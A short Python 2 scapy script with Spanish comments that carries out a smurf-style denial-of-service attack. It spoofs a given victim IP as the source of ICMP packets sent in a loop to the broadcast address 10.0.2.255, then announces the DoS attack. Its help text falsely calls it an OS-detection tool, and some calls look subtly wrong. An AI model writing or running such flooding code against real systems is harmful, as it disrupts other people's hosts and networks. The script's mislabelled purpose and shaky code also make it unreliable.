#!/usr/bin/python



from scapy.all import *

import logging
import argparse
import sys

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

parser = argparse.ArgumentParser(description="Script para detectar el OS de un sistema")
parser.add_argument('-P', '--IP_USER',metavar="IPUSER", help="IP de la victima", required=True, dest='USER')
parser.add_argument('-n', '--ITERATIONS', metavar="ITERATIONS", help="Numero de paquetes", required=True,dest='NUMBER')

args = parser.parse_args()

sendp(IP(dst="10.0.2.255",src=args.USER)/ICMP(), loop=args.NUMBER)


print  'Iniciando ataque Dos a ' + args.USER  
